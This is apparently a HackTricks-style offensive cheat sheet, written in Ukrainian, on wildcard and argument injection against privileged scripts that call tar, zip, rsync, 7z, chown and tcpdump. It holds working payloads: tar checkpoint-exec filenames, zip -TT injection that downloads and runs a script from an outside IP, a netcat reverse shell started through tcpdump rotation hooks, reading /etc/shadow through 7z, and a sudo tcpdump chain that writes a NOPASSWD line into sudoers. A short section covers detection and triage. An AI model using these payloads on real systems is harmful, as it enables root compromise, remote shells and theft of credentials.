# Wildcards Spare Tricks

> Wildcard (aka *glob*) **argument injection** виникає, коли привілейований скрипт запускає Unix binary, такий як `tar`, `chown`, `rsync`, `zip`, `7z`, … із wildcard без лапок, наприклад `*`.
> Оскільки shell розгортає wildcard **до** виконання binary, атакер, який може створювати файли в робочому каталозі, може створювати імена файлів, що починаються з `-`, щоб вони інтерпретувалися як **options замість даних**, фактично непомітно передаючи довільні flags або навіть commands.<sup>[[6]](#references)</sup>
> На цій сторінці зібрано найкорисніші primitives, нещодавні дослідження та сучасні засоби виявлення за 2023-2025 роки.

## chown / chmod

Ви можете **скопіювати власника/групу або біти дозволів із reference file**, зловживаючи flag `--reference`, коли ім’я файлу, схоже на option, розгортається wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Коли root згодом виконує щось на кшталт:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Розгорнутий `--reference=.drf.php` перевизначає явно задані owner/mode, через що відповідні файли успадковують metadata від `.drf.php` (і, за наведеного вище налаштування, стають доступними для запису атакувальнику).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (комбінована атака).<sup>[[7]](#references)</sup>
Також дивіться класичну статтю DefenseCode для деталей.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Виконуйте довільні команди, зловживаючи функцією **checkpoint** GNU tar та діями checkpoint.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Після того як root виконує, наприклад, `tar -czf /root/backup.tgz *`, `shell.sh` запускається від імені root.<sup>[[10]](#references)</sup>

### Зауваження щодо перевизначення compressor у bsdtar / macOS

Стандартний `tar` у нещодавніх версіях macOS (на основі `libarchive`) *не* підтримує інтерфейс `--checkpoint` у GNU tar, але bsdtar документує **--use-compress-program** для вибору зовнішнього compressor.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Коли привілейований скрипт запускає `tar -cf backup.tar *`, він вибирає `sh` через `PATH` жертви, а bsdtar запускає його як compressor.<sup>[[11]](#references)</sup> Це доводить option injection, але саме по собі не є надійним primitive для виконання довільних команд: ім’я файлу, створене wildcard, не може містити `/`, а bsdtar передає дані архіву, а не shell-команду, вибрану атакувальником. Для виконання коду додатково потрібен executable, який можна контролювати та який буде знайдено через `PATH`, або інший канал аргументів, здатний вказати корисну програму.

---

## rsync

`rsync` дає змогу перевизначити remote shell або remote binary за допомогою прапорців командного рядка, таких як `-e` і `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Якщо root згодом заархівує каталог за допомогою `rsync -az * backup:/srv/`, впроваджений прапорець може запустити shell через механізм remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Навіть коли привілейований скрипт *захисно* додає `--` перед wildcard (щоб зупинити розбір опцій), CLI 7-Zip приймає **file list files**, якщо додати `@` перед іменем файлу. Поєднання цього із symlink дає змогу *exfiltrate довільні файли*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Якщо root виконує щось на кшталт:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip спробує прочитати `root.txt` (→ `/etc/shadow`) як список файлів і завершить роботу, **вивівши вміст у stderr**.<sup>[[13]](#references)</sup>

Це працює навіть із `-- *`, оскільки CLI 7-Zip явно приймає як звичайні імена файлів, так і `@listfiles` як позиційні аргументи, тому буквальне ім’я файлу на кшталт `@root.txt` усе одно обробляється спеціальним чином.<sup>[[13]](#references)</sup>

---

## zip

Існують два дуже практичні примітиви, коли застосунок передає керовані користувачем імена файлів до `zip` (через wildcard або шляхом переліку імен без `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE через test hook: `-T` вмикає “перевірку архіву”, а `-TT <cmd>` замінює програму перевірки на довільну програму (довга форма: `--unzip-command <cmd>`). Якщо ви можете інжектувати імена файлів, що починаються з `-`, розділіть прапорці між різними іменами файлів, щоб працював розбір short-options.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Примітки
- НЕ намагайтеся використати одне ім’я файлу на кшталт `'-T -TT <cmd>'` — короткі опції обробляються посимвольно, тому це не спрацює. Використовуйте окремі токени, як показано.<sup>[[3]](#references)</sup>
- Якщо застосунок видаляє скісні риски з імен файлів, отримайте файл із bare host/IP (типовий шлях `/index.html`) і збережіть локально за допомогою `-O`, а потім виконайте його.<sup>[[3]](#references)</sup>
- Ви можете налагодити parsing за допомогою `-sc` (показати оброблений argv) або `-h2` (додаткова довідка), щоб зрозуміти, як обробляються ваші токени.<sup>[[3]](#references)</sup>

Приклад (локальна поведінка у zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Якщо веб-рівень повертає `zip` stdout/stderr (що часто трапляється з наївними wrapper-ами), інжектовані flags на кшталт `--help` або помилки через некоректні options з’являться у HTTP-відповіді, підтверджуючи command-line injection і допомагаючи налаштовувати payload.<sup>[[3]](#references)</sup>

---

## Додаткові кандидати для option-injection

Коли привілейований wrapper розгортає writable directory за допомогою wildcard, варто перевірити наведені нижче документовані option hooks.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Передати command string до shell |
| `git`   | `-c core.sshCommand=<cmd>` | Використовувати `<cmd>` замість SSH для Git fetch/push |
| `scp`   | `-S <program>` | Використовувати альтернативну SSH-compatible connection program |

Ці primitives корисно перевіряти на додаток до класичних *tar/rsync/zip*.

---

## Пошук вразливих wrapper-ів і jobs

Нещодавні case studies та рекомендації з detection показують, що wildcard/argv injection більше не є проблемою лише **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Цей самий клас помилок продовжує траплятися в:

- web features, які "завантажують усе як zip/tar" із upload directories, контрольованих attacker-ом
- debug shells постачальників або appliance, які надають wrapper для **tcpdump** із полями filename/filter, контрольованими attacker-ом
- backup або rotation jobs, які викликають `tar`, `rsync`, `7z`, `zip`, `chown` або `chmod` у writable directories

Корисні команди для triage (виклик `pspy` використовує документовані process/file-event та interval flags).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Швидкі евристики:

- `-- *` — хороший спосіб виправлення для багатьох GNU tools, але **не** для `7z`/`7za`, оскільки `@listfiles` обробляються окремо.<sup>[[13]](#references)</sup>
- Для `zip` шукайте обгортки, які безпосередньо перебирають контрольовані користувачем імена файлів; розділення коротких опцій (`-T` + `-TT <cmd>`) усе ще працює навіть без shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Для `tcpdump` особливу увагу приділяйте обгорткам, які дають змогу контролювати **імена вихідних файлів**, **параметри ротації** або аргументи **повторного відтворення capture-файлів**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE через ін'єкцію в argv в обгортках

Якщо restricted shell або vendor wrapper формує командний рядок `tcpdump` шляхом конкатенації контрольованих користувачем полів (наприклад, параметра "file name") без суворого quoting/validation, можна непомітно додати додаткові flags `tcpdump`. Комбінація `-G` (ротація на основі часу), `-W` (обмеження кількості файлів) і `-z <cmd>` (команда після ротації) забезпечує довільне виконання команд від імені користувача, який запускає tcpdump (часто root на appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Передумови:

- Ви можете впливати на `argv`, переданий до `tcpdump` (наприклад, через wrapper на кшталт `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper не санітизує пробіли або токени, що починаються з `-`, у полі file name.<sup>[[4]](#references)</sup>

Класичний PoC (запускає скрипт reverse shell із доступного для запису шляху).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` обертає файл щосекунди, а `-W 1` зупиняє роботу після одного обернутого файлу; перед обертанням capture має отримати відповідний packet.<sup>[[18]](#references)</sup>
- `-z <cmd>` запускає post-rotate command один раз для кожного обертання та передає шлях до закритого savefile як аргумент; переконайтеся, що обробка аргументів script/interpreter відповідає вашому payload.<sup>[[18]](#references)</sup>

Варіанти без removable media:

- Якщо у вас є будь-який інший primitive для запису файлів (наприклад, окрема command wrapper, яка дозволяє перенаправлення виводу), помістіть свій script у відомий шлях і запустіть `-z /path/script.sh`; за потреби нехай script сам викликає `/bin/sh`.<sup>[[18]](#references)</sup>
- Якщо vendor wrapper дозволяє вибрати шлях для обернутого файлу, перевіряйте контроль цього шляху лише разом із post-rotate command, яка інтерпретує свій savefile argument; самого контролю шляху недостатньо для виконання вмісту файлу.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump із wildcards/додатковими аргументами → довільний запис/читання та root

Приклад небезпечного anti-pattern у sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Правило залишає доступними кілька варіантів у задокументованому парсері tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` і permissive patterns обмежують лише перший аргумент `-w`. `tcpdump` приймає кілька опцій `-w`; остання має пріоритет.<sup>[[3]](#references)[[18]](#references)</sup>
- Правило не фіксує інші опції, тому дозволені `-Z`, `-r`, `-V` тощо.<sup>[[3]](#references)[[18]](#references)</sup>

Нижче задокументовано відповідні примітиви.<sup>[[3]](#references)[[18]](#references)</sup>
- Перевизначити шлях призначення за допомогою другого `-w` (перший лише задовольняє sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Обхід шляхів усередині першого `-w`, щоб вийти за межі обмеженого дерева.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Примусово встановити власника вихідних файлів за допомогою `-Z root` (створює файли, власником яких є root, будь-де).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Запис довільного вмісту шляхом відтворення підготовленого PCAP через `-r` (наприклад, щоб додати рядок до sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Створіть PCAP, що містить точне ASCII-навантаження, і запишіть його від імені root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Читання довільних файлів/витік секретів за допомогою `-V <file>` (інтерпретує список savefiles). Діагностичні повідомлення про помилки часто виводять рядки, розкриваючи вміст.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: ін'єкція аргументів zip до RCE + privesc через неправильну конфігурацію sudo для tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Повний ланцюжок експлуатації](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Виявлено потенційний shell через Wildcard Injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Назад у майбутнє: Unix Wildcards вийшли з-під контролю (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils: виклик `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils: виклик `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [Контрольні точки GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Довідник bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Довідник rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Синтаксис командного рядка 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Довідник flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Документація конфігурації Git](https://git-scm.com/docs/git-config)
- [17] [Довідник `scp` OpenBSD](https://man.openbsd.org/scp)
- [18] [Довідник tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
